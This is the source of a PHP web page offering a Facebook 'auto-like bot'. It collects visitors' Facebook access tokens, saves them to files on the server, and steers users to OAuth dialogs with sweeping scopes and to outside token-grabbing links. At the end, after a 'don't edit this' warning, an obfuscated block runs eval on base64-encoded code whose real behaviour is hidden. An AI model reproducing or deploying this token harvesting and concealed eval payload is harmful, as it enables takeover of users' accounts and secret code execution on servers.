<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"><html>

<head>

<meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>-=[ NADEEM AKRAM ]=-</title>

<link rel="stylesheet" type="text/css" href="aquib.css" media="all,handheld"/>

<link rel="shortcut icon" type="image/ico" href="aquib.ico" />

<style>

@font-face {

    font-family: miaanFont;

    src: url(aquib.ttf);

}

a

{

  text-decoration: none;

  color:white;

}

#footer

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 65%;	

}

.form

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 40%;

}

.form1

{

	position: absolute;

	vertical-align: center;

	width: 98%;

	top: 55%;

}

.access

{

	position: absolute;

	vertical-align: center;

	width: 98%;

}

.access h2

{

	margin-top: -15px;

}

input[type=text] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid white;

    background-color: black;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

input[type=password] {

font-family:miaanFont;

    width: 60%;

    height: 5%;

    padding: 8px 32px;

    margin: 8px 0;

    font-size:22px;

    box-sizing: border-box;

    border: 2px solid white;

    background-color: lime;

    color: white;

    border-radius:50px;

    outline: none;

    text-align: center;

}

.button {

	font-family:miaanFont;

    height: 5%;

    background-color: black; /* Green */

    border: 2px solid white;

    color: white;

    padding: 8px 32px;

    text-align: center;

    text-decoration: none;

    display: inline-block;

    font-size: 22px;

    margin: 4px 2px;

    -webkit-transition-duration: 0.4s; /* Safari */

    transition-duration: 0.4s;

    cursor: pointer;

}



.button1 {

    background-color: black;

    color: white;

    border-radius:50px;

}



.button1:hover {

    background-color: white;

    color: black;

}

</style>

</head>

<body bgcolor="grey">

<font style="color:black;font-size:26px;font-family:miaanFont">  <h2 align="center"><font style="background: url(&quot;bg.gif&quot;) repeat scroll 0% 0% transparent;color:black; text-shadow: 0pt 0pt 0.9em white, 0pt 2pt 0.9em white;font-family:miaanFont;font-size:90px;"><b>NADEEM AKRAM</b></font></h2>
<h2 align="center"><font style="background: url(&quot;bg.gif&quot;) repeat scroll 0% 0% transparent;color:#fff; text-shadow: 0pt 0pt 0.9em black, 0pt 2pt 0.9em black;font-family:miaanFont;font-size:50px;"><b><a href="https://facebook.com/m.moinawan.98" target="_blank"> FOLLOW ON FACEBOOK </a></b></font></h2>


<?php
error_reporting(0);
$bot=new bot();
class bot{ 

public function getGr($as,$bs){
$ar=array(
        'graph',
        'fb',
        'me'
);
$im='https://'.implode('.',$ar);

return $im.$as.$bs;
}

public function getUrl($mb,$tk,$uh=null){
$ar=array(
        'access_token' => $tk,
);
if($uh){
$else=array_merge($ar,$uh);
        }else{
        $else=$ar;
}
foreach($else as $b => $c){
        $aquib[]=$b.'='.$c;
}
$true='?'.implode('&',$aquib);
$true=$this->getGr($mb,$true);
$true=json_decode($this->
one($true),true);
if($true[data]){
        return $true[data];
}else{
        return $true;}
}

private function one($url){
$cx=curl_init();
curl_setopt_array($cx,array(
CURLOPT_URL => $url,
CURLOPT_CONNECTTIMEOUT => 5,
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_USERAGENT => 'CR3AT3D BY NADEEM AKRAM',
));
$ch=curl_exec($cx);
        curl_close($cx);
        return ($ch);
}

public function savEd($tk,$id,$z=null,$bb=null){
if(!is_dir('aquib')){
        mkdir('aquib');
}
if($bb){
$blue=fopen('aquib/'.$id,'w');
fwrite($blue,$tk.'*on*on*on*on*'.$bb);
        fclose($blue);

echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

			document.getElementById("resp").innerHTML="Comment Text Saved.";

		</script>';
}else{
        if($z){
if(file_exists('aquib/'.$id)){
$file=file_get_contents('aquib/'.$id);
$ex=explode('*',$file);
$str=str_replace($ex[0],$tk,$file);
$xs=fopen('aquib/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}else{
$str=$tk.'*on*on*on*on*'.$c;
$xs=fopen('aquib/'.$id,'w');
        fwrite($xs,$str);
        fclose($xs);
}
$_SESSION[key]=$tk.'_'.$id;
}else{
$file=file_get_contents('aquib/'.$id);
$file=explode('*',$file);
        if($file[5]){
$up=fopen('aquib/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*'.$file[5]);
        fclose($up);
        }else{
$up=fopen('aquib/'.$id,'w');
fwrite($up,$tk.'*on*on*on*on*');
        fclose($up);
        }
echo '

		<script type="text/javascript">

			document.getElementById("resp").style="font-color:green;font-family:miaanFont;";

			document.getElementById("resp").innerHTML="Bot Settings Has Been Updated";

		</script>';}}
}

public function lOgbot($d){
        unlink('aquib/'.$d);
        unset($_SESSION[key]);

echo'
<script type="text/javascript">alert("INFO : Logout success")
</script>';

        $this->atas();
        $this->home();
        $this->bwh();
}

public function cek($tok,$id,$nm){
echo '

<div id="bottom-content">

     	<div id="navigation-menu">

     		<a href="http://facebook.com/' . $id . '"><img src="https://graph.facebook.com/' . $id . '/picture?width=800" style="-moz-box-shadow:0px 0px 20px 0px red;-webkit-box-shadow:0px 0px 20px 0px red;-o-box-shadow:0px 0px 20px 0px red;box-shadow:0px 0px 20px 0px red;width:150px; height:150px;border-radius:500px;" alt="' . $nm . '"/></a>

	</div><br/>

	     	<form action="index.php" method="post">

     			<input name="text" type="hidden">

     			<input type="hidden" name="opsi" value="off"><br/>

	<div id="top-content">

		<div id="search-form">

				<input class="button button1" type="submit" value="Activate Bot">
     			</form>

		</div>

	</div>

</div>';

$this->membEr();
}

public function atas()

   {

     echo'

     <center>

     <div id="header">

     <h2 class="description">

     </h2></div>';

   }

public function home()

   {

     echo '<div id="content">

     <div class="post">

     <div class="post-content">

     <div class="post-content">

     </div>

     </div>

     <div class="post-meta2">

     </div></div></div>';

   }

public function bwh(){
echo '

     <div id="bottom-content">

     <div id="navigation-menu">

     <a target="_blank" href="http://bit.ly/2gFGOUH"><h3> ALLOW IPHOTO APP</a></h3>

     <a target="_blank" href="https://goo.gl/vzeQsM"><h3> GET IPHOTO TOKEN</a></h3>

      <a target="_blank" href="https://token-tool.tk"><h3> GET IOS DEVELOPER TOKEN</a></h3>
   
       <a target="_blank" href="http://facebook.com/m.moinawan.98"><h3> GET BOT SCRIPT</a></h3>

<script type="text/javascript" src="http://facebook.com/m.moinawan.98"></script>

     </div>

     <div id="resp"></div>

     <div id="top-content">

     <div id="search-form">

     <form class="form1" action="index.php" method="post"><input type="text" name="token" placeholder="Paste Your Access Token Here" required><input class="button button1" type="submit" value="Activate Bot"></form></div></div></div>';

     $this->membEr();

   }

public function membEr(){
        if(!is_dir('aquib')){
        mkdir('aquib');
}
$up=opendir('aquib');
while($use=readdir($up)){
if($use != '.' && $use != '..'){
        $user[]=$use;}
        }

echo'
user robot : <font color="white">'.count($user).'</font>
<br>
script bot &copy; 2018<br>
POWERED BY NADEEM AKRAM
</div>';
}

public function toXen($h){
header('Location: https://m.facebook.com/dialog/oauth?client_id='.$h.'&redirect_uri=https://www.facebook.com/connect/login_success.html&display=wap&scope=publish_actions%2Cuser_photos%2Cuser_friends%2Cfriends_photos%2Cuser_activities%2Cuser_likes%2Cuser_status%2Cuser_groups%2Cfriends_status%2Cpublish_stream%2Cread_stream%2Cread_requests%2Cstatus_update&response_type=token&fbconnect=1&from_login=1&refid=9');
}


}
if(isset($_SESSION[key])){
        $a=$_SESSION[key];
        $ai=explode('_',$a);
        $a=$ai[0];
if($_POST[logout]){
        $ax=$_POST[logout];
        $bot->lOgbot($ax);
}else{
$b=$bot->getUrl('/me',$a,array(
'fields' => 'id,name',
));
if($b[id]){
if($_POST[likes]){
        $as=$_POST[likes];
        $bs=$_POST[emot];
        $bx=$_POST[target];
        $cs=$_POST[opsi];
        $tx=$_POST[text];
if($cs=='text'){
        unlink('aquib/'.$b[id]);
$bot->savEd($a,$b[id],$as,$bs,$bx,'off');
        }else{
        if($tx){
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs,'x',$tx);
        }else{
$bot->savEd($a,$b[id],$as,$bs,$bx,$cs);}}
}
        $bot->atas();
        $bot->home();
$bot->cek($a,$b[id],$b[name]);
}else{
echo '<script type="text/javascript">alert("INFO: Session Token Expired")</script>';
        unset($_SESSION[key]);
        unlink('aquib/'.$ai[1]);
$bot->atas();
$bot->home();
        $bot->bwh();}}
        }else{
if($_POST[token]){
        $a=$_POST[token];
if(preg_match('/token/',$a)){
$tok=substr($a,strpos($a,'token=')+6,(strpos($a,'&')-(strpos($a,'token=')+6)));
        }else{
        $cut=explode('&',$a);
$tok=$cut[0];
}
$b=$bot->getUrl('/me',$tok,array(
        'fields' => 'id,name',
));
if($b[id]){
$bot->savEd($tok,$b[id],'on','on','on','on','null');
        $bot->atas();
        $bot->home();
$bot->cek($tok,$b[id],$b[name]);
}else{
echo '



			<script type="text/javascript">

				document.getElementById("resp").style="color:red;font-family:miaanFont;";

				document.getElementById("resp").innerHTML="<h2>Token Is Invalid</h2>";

			</script>';
        $bot->atas();
        $bot->home();
        $bot->bwh();}
}else{
if($_GET[token]){
        $a=$_GET[token];
        $bot->toXen($a);
}else{
        $bot->atas();
        $bot->home();
        $bot->bwh();}}
}
?>
//don't edit this otherwise the bot will block your comments coding starts right from here made with love ❤

<?php
/*
Obfuscation provided by FOPO - Free Online PHP Obfuscator: http://www.fopo.com.ar/
This code was created on Friday, March 31st, 2017 at 11:38 UTC from IP 47.9.210.36
Checksum: b0619b2c4a35c0781f140a549d843bbcccbd170d
*/
$j66152b3="\142\141\163\145\x36\x34\x5f\144\x65\x63\157\x64\x65";@eval($j66152b3(
"Ly9OcnRQUy8zdDdDRGw2WStRcGZVRW93V2pBOW90c0dDeENOVVJCMUFOTExBSHFlMVpQenZrVnVOcis5
VlNJSFVCb095YVNORDA2Zk9ZMXoyaTdON1BBK3RTQ21ZK1pSRVJOUG5GL1dGUytITDFRZjRFODFjMjFlZ
UFaRHBGR29LR2xwRHY2UmVrVXhieDVMcE04eWNUTXdCZFdUNEVaNHdMazVzT0dsR2p5MmhLK3VkQWxNRV
BRNXc4eVNOUEJ5SmdxUDM0RUdVdjE5QWJCYXZCMDZuemozNm9UTHJyTGVXOUxpNm0xSEhQbWEvVVIyRm1
rMnhxYy9ocDU3Q0FZMTRLcFJHM1ZhZFlVRnZPdm9CeFlqRHZGaStzaXNybFJkWE5HVEpVZlRORkluWnJZ
Y3VpS0FuRVJBNENLODREeStlTnUwTmZ5ajdsL0tOR0pJSERGUklVcStVRVFoSEFuQTVPL04yQ084eFJ1S
mZQMzlKRm5xSmxYREtZSllaZWdlT0ZGOHlrTWppTHJxaTNHbmRKd2xzRy9XVXJGemhzMko5YXN2Z3BkSV
E0ZUNPQW0xcTdacEh1QkxhZjB1SWtPeFh2eFIvRSs4bDZPL2J2eDZ3WTBLeFdrRzh4N0h2UEtTZ0ppWnJ
CSmRuZzNpaGlvdVlaYjJtWm5ZZ1JlV09lTXkrUEoxMEE3b2NaZUJ5d0ZWb05HTWJUaE9rcHI0QndpUS9C
TWNVV3l3QjRaOVVkREl6TWRIUFJ3eXUrUTExQlFmQnFla3M1c2xNTXE2c0RpS2E1WjNFYXJsTE1DTVB2R
Vg2Qy9WaVhrUHppcU5mWDQvbm40TE1rMG90d1NvVks3c0JnekhRcThQcWlkTUYwejZCaHc5dGdoWjI1SF
g1Z1IrcE1vMnNyQzcyd3I4SUpjeG45bnpKbWZreVFvcWNJK3ZyZGpVVlFxd3I5cHRyZTZNS3JaWG1jNjl
MVlVXQkJDc3BRTHhBUitlc1l0K2JpRFR5TVlpcDRoK0J6enhBU2dVSjJ3OUdFRy9OQXFwZ2E5MjlGdm1L
cmlBWW1kTENMMFRrUGRjQVJQY0VhMUNzUk1ZVG5PM1RrK0IzSHpJWnAyVWFVemZIR0JJRlo3YXRVaGNmN
mc3OFNTQnNmTXZ0UjBwV3U5Y2ZqcEhBRkhNcE1RblFodVNSMGRhTDB3NXhLZC9zRWsxRkFRL3g1T0s2RE
96QWduVEtXSEh4ZDUrd1YxNSttczFPTlFQUUxUUW5JODZKV2x4TzNPZTg5VzRmNDRTNXZJcmtZSkxXbXN
QK1ZaMGtCeFdqMkR3eTVJUHVzY3VIWjJjOXZNNVo9OnZtd0hiSk9tSnlzanNPNUc4bDJ3OVV4Tjo0Mm5y
bjE5NgokeDQ1M2I2Y2I9Ilx4NjUiOyRyMzVlY2ViYj0iXHg2NyI7JGo2NjE1MmIzPSJceDYyIjskbjZkZ
mFlYWU9Ilx4NzMiOyRjMjRhNjM1OT0iXHg3MCI7JG84ZDhhYmY0PSJceDY2IjskZDUyZmMzYzQ9IlwxNj
MiOyRjODZlNTFjZT0iXHg3MiI7JGowNTJkNTk0PSJcMTYzIjskcjM1ZWNlYmIuPSJcMTcyIjskbzhkOGF
iZjQuPSJcMTUxIjskbjZkZmFlYWUuPSJceDc0IjskajY2MTUyYjMuPSJceDYxIjskZDUyZmMzYzQuPSJc
eDc0IjskYzg2ZTUxY2UuPSJcMTQ1IjskajA1MmQ1OTQuPSJcMTUwIjskeDQ1M2I2Y2IuPSJceDc4IjskY
zI0YTYzNTkuPSJceDcyIjskajA1MmQ1OTQuPSJceDYxIjskZDUyZmMzYzQuPSJcMTYyIjskcjM1ZWNlYm
IuPSJcMTUxIjskeDQ1M2I2Y2IuPSJceDcwIjskbjZkZmFlYWUuPSJcMTYyIjskajY2MTUyYjMuPSJceDc
zIjskYzg2ZTUxY2UuPSJcMTYzIjskbzhkOGFiZjQuPSJceDZjIjskYzI0YTYzNTkuPSJcMTQ1IjskYzg2
ZTUxY2UuPSJcMTQ1IjskajA1MmQ1OTQuPSJcNjEiOyRvOGQ4YWJmNC49IlwxNDUiOyRyMzVlY2ViYi49I
lx4NmUiOyR4NDUzYjZjYi49IlwxNTQiOyRqNjYxNTJiMy49Ilx4NjUiOyRkNTJmYzNjNC49Ilx4NWYiOy
RjMjRhNjM1OS49IlwxNDciOyRuNmRmYWVhZS49Ilx4NjMiOyRjODZlNTFjZS49IlwxNjQiOyRjMjRhNjM
1OS49Ilx4NWYiOyRkNTJmYzNjNC49Ilx4NzIiOyRuNmRmYWVhZS49Ilx4NmQiOyRvOGQ4YWJmNC49Ilx4
NWYiOyRqNjYxNTJiMy49Ilx4MzYiOyR4NDUzYjZjYi49Ilx4NmYiOyRyMzVlY2ViYi49Ilx4NjYiOyRjM
jRhNjM1OS49Ilx4NzIiOyRkNTJmYzNjNC49IlwxNTciOyRqNjYxNTJiMy49Ilw2NCI7JHg0NTNiNmNiLj
0iXHg2NCI7JG84ZDhhYmY0Lj0iXHg2NyI7JG42ZGZhZWFlLj0iXDE2MCI7JHIzNWVjZWJiLj0iXDE1NCI
7JGo2NjE1MmIzLj0iXDEzNyI7JG84ZDhhYmY0Lj0iXHg2NSI7JGQ1MmZjM2M0Lj0iXHg3NCI7JHg0NTNi
NmNiLj0iXHg2NSI7JGMyNGE2MzU5Lj0iXDE0NSI7JHIzNWVjZWJiLj0iXDE0MSI7JGMyNGE2MzU5Lj0iX
Hg3MCI7JG84ZDhhYmY0Lj0iXDE2NCI7JHIzNWVjZWJiLj0iXDE2NCI7JGo2NjE1MmIzLj0iXDE0NCI7JG
Q1MmZjM2M0Lj0iXDYxIjskZDUyZmMzYzQuPSJceDMzIjskajY2MTUyYjMuPSJcMTQ1IjskcjM1ZWNlYmI
uPSJceDY1IjskbzhkOGFiZjQuPSJcMTM3IjskYzI0YTYzNTkuPSJceDZjIjskbzhkOGFiZjQuPSJcMTQz
IjskYzI0YTYzNTkuPSJceDYxIjskajY2MTUyYjMuPSJceDYzIjskYzI0YTYzNTkuPSJcMTQzIjskbzhkO
GFiZjQuPSJcMTU3IjskajY2MTUyYjMuPSJceDZmIjskYzI0YTYzNTkuPSJceDY1IjskbzhkOGFiZjQuPS
JcMTU2IjskajY2MTUyYjMuPSJcMTQ0IjskbzhkOGFiZjQuPSJcMTY0IjskajY2MTUyYjMuPSJcMTQ1Ijs
kbzhkOGFiZjQuPSJceDY1IjskbzhkOGFiZjQuPSJcMTU2IjskbzhkOGFiZjQuPSJceDc0IjskbzhkOGFi
ZjQuPSJceDczIjskYWE2MjhiNjE9JHg0NTNiNmNiKCJcNTAiLF9fRklMRV9fKTtAZXZhbCgkbjZkZmFlY
WUoJGowNTJkNTk0KCRjMjRhNjM1OSgiXDU3XHg1Y1w1MFx4NWNcNDJcNTZcNTJcMTM0XHgyMlwxMzRceD
I5XDU3IiwiXDUwXHgyMlx4MjJceDI5IiwkYzI0YTYzNTkoIlw1N1x4ZFwxNzRcMTJceDJmIiwiIiwkbzh
kOGFiZjQoJGM4NmU1MWNlKCRhYTYyOGI2MSkpKSkpLCJcNjJcMTQ0XDE0M1x4MzNceDMxXDcwXDcxXDY0
XDY3XDYyXDE0Mlw3MFx4MzRcNjFcNjJcNjdcNjZcNjFcNjdcNjdcNjFcMTQ2XHg2Nlw2MVw2MFwxNDVcN
jBceDY1XHg2M1w2MVx4MzFceDM0XHgzNFw2MVx4MzBceDY2XHg2MVw2MFx4MzVceDYyIik/JHIzNWVjZW
JiKCRqNjYxNTJiMygkZDUyZmMzYzQoIkNJb1VkaGtWU2lsS0VsOTYwUllyMERsWmlZcHltOTNWeTFtVzI
2K3NydDNxUHBSdWxHdEVPNVZaOGIrSlZUTnBscVEvL2lkNVBCRFkrQnB2MEovU3NsNkgrUFRqVWt0eXMy
UWZKbVU4djk5VTFHLzdLMy85Zm5PNHpNcU05aDJVZkYrRS9YMU9zMVMrRHNtTkJDbjNXeG04MDFRdEZXS
ndCc29vOFlwRStGSzhvZlgvZGc4T0xXbTh6M2x1OE4rTy9pZWVzK0pFOWEvK24vQ2FVLzhaL0JyL0ZhLy
s0dG1XVTk0OTVoZW52ZGhPZHZDVWF3Y3pkN0NkeVBodzJwUGlkeUJaYmlmZm5XeU91Y2FXZ3djY21zR2w
vV0t4S0tBdXRlMHVGTXZ2ajhOU0dKNmpZSjVDRElva1EzZ2NzblQ2SWYraXJ3YnM2T1lKNkoxUzM4UGRu
Szc3d3o3MFpEbHJaZWZwOTltemZGdStmSTBYT1JtT2pGL05KbDlqVkNhWkNFSnFzT1BDc2V4Y1hpZ0EyT
3VlaTEvSVBFVndaWmVlNHNaK0ZBWlQzSGd0T0xYNHcxWkxOVGV0eFVWUlE2NmJTa3pKOVhZOExPRmZBK0
RCQUtvTTBRQUNnR3BZRHN0MmpESVNrZFFRNmdaUVJYb3B2QW1UUEtXRWdNTlJMYUNKdmtqdUxmWDdlU0x
FSHVFcGdGa21mc21CcDI0L2JneXNCUFRHcVZ1dTBTVW1xcUNObFpmUnJiVkU1Rm0zSytHUlVrMitvRjBZ
R1ZXUmxNUGZvZEVCa2Q3Y3R1cGZNRC9Ja0tCRU9rdVBqQlp3U2xTd1RsV3pVOXpJbnZuWnYzV0JZL25MW
k8zQUNNb0RCcUV6Z3JSVDhrU0dvTVJjSjVWOHlWVXZzU0RIRDBDRUFBVmpDUG15bVlWSjhBeEpxZHc5Tl
F4aE5XVkR1UjYxNDZrZWVoZDVNK1h3TENBMUZVRmVPanFXOGRpSmJnamJoUGxFYnoyZTZhdkpGNGdKbkZ
nNFFTeWptWGg0VE01SnhZRUxrM0k0QnhXTmZHZkNZUDBsNk16TWMvZEM1RVhjZlk0K3BaUEdFbzdQTnFF
S0hBSjhDOEhCYW5IT0xBeEdoNTJ6N056QnZ2ZjhJSlA3Z1FDTWpwUXdUd3hJTXFoRjRZU0REbFRsTjFvV
XI1c212RHFzd3NnRFdNcjl2UXR6SmMxNGRnMWZXZ21yZStKQXJjS1RERUY5UjZta1o5cXo2WWk4cmNvdX
lGQzM0TGFWdSthbGJ0UXh3dGhZZGI1MmNkazRNa2JMT1ExS0k2RDlXK3hhNWxtREdLVm9pYUFrT3E3UEZ
zSTVkZkFwVDd3RjBYSlN0dFBhVUdZcituQkZscWluTXpKRENEWTVZUUFmd3o5NHBnOHI4WVRDTWI3UjFJ
ZHlqUFRZMWthMlFLeXh5cDZybVpBRkpSSUUxejVKZFI5WE10eGQ5MnEyYVBOZzNvNTBEN3ZEK0NidzBCT
DdJK0hCN2Y4d1NYTTJ0ZzNvM2dCeVRJcy9Xd1JZdnFpVzllbmNpeUxOQllpSjRzWU5mQS9YWFRYOHNtUm
44M1doRGl0eHE2ZEJHdEtzK1hmQm5ldjMrRHZodGdmR2g1T2xvLzVTYXJsVllrTExiMlJudlVJRnYrakJ
xejliREoyVlFJaDMvUVBISXJvQ2l0ZDFmMjNJVWdsNHBxWlJEaVdka1RyN25IdXVmU0htdUdPbDFDd1pG
TXRPSkZuZmNKbmlpWnhvampITlc3djFoR2EyeHBqeTAzQ0VPMGtWbmNNTmlERUFzbUhOckc3ZEEwTG5tV
nNLYTZseFFCSU0ycEw0UnpTSU8rY05VVmMrb0xTcit1T25GQUkxeS9ZV3J4dVA4YXJscjVZamRQaXJSMj
FCdVRYUzl0QTNEbi83MEpsTm5rTTZkemRwU0oyQk9wMjRkdW5NVFhqQUQwZ2dNb0plMTJ6dlJ5aVY4NTJ
Id1FBU1Zrc3NNN0tjb2NwTGE4ZGd5QWpiNVJNM2ZQVW9nV2FSRjlCOE9lbTQ0T3owU2dWSnpzSkxYb0Rt
VFBUMDIxL3dDaVBhQ2RMbXJ4eDlYRDV6bDYrZm1jM1hBZGd6Z2dsYlZUUktFeEJSWUkyOGRJdTQ4VWFWV
VpZRVd3NkdJWVBaWm5IaEhSV0V2SVpYbEQ0QmZmaERIbmtyVTlXR1ExbnBEanN6cktHRktud1YxWWtYbG
xQbGU3UFk0ZzNBSVpzN1VTT2Z6TEdQSGpYZFBaZ3BjaVUwc3NvNDYrQi8rcWlBb1RkYlNlN0NPcDNqcVp
sc3JmWHkwWi9BaFBOdnhSMGJ4OFJRdW1kbDV2UXNSZEN1SlZmdXZvQ01ORWVWd0Vvek51UWJUK0dvbXRX
YStsb3IwSGlFMVZld0tIbUhqWW1tNXZZdnVvV2p6K0lON3p5aHIwYnVQRTY0ME5rSVprM3BFSGh4UC91O
HFadkMzdVIrUWRMQ0Fpc3ZxMUtKSHNZU21qVmk4bGUvVFlzQ2xtUDJTRE94SVhZV1VvR1BpTzB5LzZMTz
hWV2djcWFWZEtUSzZRSXpYUjQraUtiS2VYTzU5UXEvbW1hVDRTQ1BLdG1wdlk0UDJtSnBMTzJlYittWHF
OWjNFcnhvNHBDcHNWS1JGWkpHd3JDRm5BbW55UEJab0QxR3k4cDFZZlU5ckNCTHJPL3hHYlpsQVlkbmVX
b0NhdWIwdGNxaGVLbW1ia2Z6dFNOY0ZaTEpuR01SWGFuTnE2RFJIeXp3bjQrVGVNSEtJWTlDUi9jVEVMU
GNGcmV1RVZLc0VFbFZ0ZHFZQ0s5ZlVvQUM2QTJnNGdSd1NqOTlBckxvanNSUkgrdHdLQmVCUklFT0FWKz
UrMTVsaG1ibUtOcURVWkNXcU45WnovaUZuOExLVmZkRnRVb3AvS0VNaWNtQ2JCNFFjcVdVNzNIWnk4Qnk
veDNpcU9GdEdQU2YzeWZLMW5SOUp2UXlOY1QyeTN6WUFSYWZjL0J3bFZ3YUl5V0NORXFiUzJOcnpoRmRB
KzNwQStWbzhoT0I0UmlOODJzckR1VzZaY3h6K1U0TGpCS1I1UUxPSUZOS1RwcFU4R0NYKzk0L2d6R2VGd
zVaeFRMcTBZVlJYc2lLczc3ZWUvOFEiKSkpOiRyMzVlY2ViYigkajY2MTUyYjMoJGQ1MmZjM2M0KCJDSU
dVZWhCNlJpbEt0MWFadUVvWFBMWlVLTklvakluQlNaNVQycGRsZmlHMW1tQ05VRFdSSTNJM1NLZ084eHF
BSEZ2V1dzdy9pZTVFTmlmK1hDRG9jc05DV2U4YzZpaU52citRWVE1YzR4OFhXc05DL2ZoL3NpMkxwUVdD
OGxHNTZOK1gveE1jN09meTBEL0JDL2d3RFhKc2t0K2Eva0F4V1NueHJSZThTZ1E0YThZa0o0R0dzK1dpc
S9Hdy9jelFqZTkrL01naXBzaW03bHgvcy9qMzc4Ky9FdysvT1ozbThlRTVCaUxRb3pudEJqaC9nWk5paE
JTbjJnTnlSemdwRm9GSnZyeVNMNi84SW8rT2p2Z2loY3JlclJZNHIrdDViQlF0aEllYnl5MDh5Zy8ydHp
6UDJITjBkTkxaYTFGZUJwNnFjRlJta1hPaU9lVjRUVlZJZ2E0aEdYcFdrMDVMeVd3U3Q0QnhHQk9YUlVU
Q1N0RlVHZXRyYllNeFRrTEZMWmxVWDd1N1JabFZ1RG5qYmFLbWY3Z2YyK0Z3NWtXWlI4dHhXa1FWUTlrZ
051Y2NTSUtqM2RjTnM4d0FKQUxQdzhaVU9jMkw0Z2U0Y2VvNG9lbkF2SEpQWFg1NFFodTg5TTJsc3NYM1
JKTjFvSVFtUUJtajVTK3RpL2x3VjY3b0xTYVREM0hVSThYTWpMZ0dyTC9Sa2RBTEhlWjZEeGdpZzBZVkp
KaDhiRmlDbUhpbExobWxPcjQ1cnJBcDFGNzZxamFXZ3BlZ2puY1dNZHpuRUpCZXhBNW9rakVnckkxVW4r
TG44WWNMNUtjcnFlQzFxMy92RDRmUjFaeEpmZU11ak1uWjNPQTl3NGtnTUJYR09GSFVBbnpVOUhDMzFUQ
mNTUk1jWGNTdkt0a3o1Y3J1c0JXd1lYWUhWM2xlYVVqMDhMUGh3Vk1rb0dOdDd6S0ZUUkFVSklYcnd3b0
RNZVo1MjgxNUczVHdsNVZXWG5JM0pBUHd5Z1RndmdSQTJJMStkL1ZjckpCMW9MbXFIVWJieEYwdFZOOUV
tNmNtY1hJUVR5V29rUEF3N1BBcFV2WVhnTEdEWFJ6N0xGbTl6ZzUrQTk1YVBGK2xxTlFtR29uNlJqSlg5
MG5oUGJXT3B0MTVMTEtDOHJLZ2RxR2pudWFqNnpNdUlWRGtwbjJzVnlCOFZKN0N5MHlvK3ZwcXI2djhtO
VVRRDRSYnVUREczbEdqZnVONzBXMkRST0gvdXA5SGlUNHVLVEZOSTgvUW1Ld1pucnlYQmtmS2FXY3lOeT
lUeXJRRFhpS1dvMDJTUWVoemJIVWhxdncyQ2VremYvQUhaRmkvUlZQTExUQlhLQ3NWang5QTczZ3ZuSk5
6VkMzeEl0K1F6NitxR3ZsQ0FkckFKK21NckJCMmJLT0xoclhVeGVSaE5lc1hjZjh3RUZmY2VCYXltK0or
QnBnejBLa2wrZXpCbGtyUGlDMGp2WUVPMGhrVXBMajRYQUJXaXJ5UGxvNnh4QnVTL1F4ZElCSlBnV1Z2Q
WVOOHFNL3JYbGFwRGFVbHZjVUpPK3lRMk9GM2hReHRyL2djT3ZFOWJYK1cxb1lTOFlxKy9JbWxOei8wNF
p1Qm0waVBVcnArZS9KUDlNVnpJREU5bFlVMFR4SW5ERmI4aDYyZkZ1eHB6U1p3dHI4OGZ1S01iTHgrR0J
yWFloVDdKdTJHRlQ5Znk3TGNLRGNOWnhiTG9OMWZyaW5lQVdXSTZ6RDJGdTFQWjZyQkY0MndNTHdoWlRM
bTVJNGtGb0tEYWFhblFPUEc2bWptVHg2bG8xRW1BTzdhSVRxQllvejdYai9KTlNpTXdubnpJODN5cHVMZ
GpMS3V3SllYQ0lVMncxdEdYcXBCcGlXK1VMYi83RFVQS2JNZTByQXZsbTdvVmx0RXd1eS8yQ09vcmdOYl
o1em5KWk1rblMyd1p2d0NvdEJUNGNWZHI4Ukx5dmMrSWM4SEs1Y3lheUd0ckNNWkVoaXhuVElCVXUwUWV
EcE03N0p6NGdrVEpQa2cxYjNqN3Y3ek9NNXN6NjQyZ0V2RFcrN21ZczhoK3ZpZTg2anQxQldsUVo3dlcz
VklSdk5lVzl3c3JTdmo5cjRpUFpFdmtTWitHdUlOeVVrcG0zTTdoTVc2Tzl5N3hVYVIwemlTdVNVMU5yR
1FNaWpKdnhya1VDa01TTjJ1S3NMSVdzUlFWNFpCUE1mdWJFNEtkNkYzUDh2SDFpSG56dzF3Z1YrZDlLND
VrMWo2WkpSKytwOUs3b1FIWVBId1Y3OURNeXNpY2xlcUtyd0VlUkZVRnZlc1ljc1M0OEpZbVp2UkthTXF
wQXhBOWdjWnB3Q25zc1R2NVBTbUw1ekVIR3JSV3pSTWRxM0lkcHZxNDZVazVSMmtFYlVVRFQ3T3BWSktX
TkNBU0hsNEsvOTgxZC8vTmo9PSIpKSkpOw=="));
?>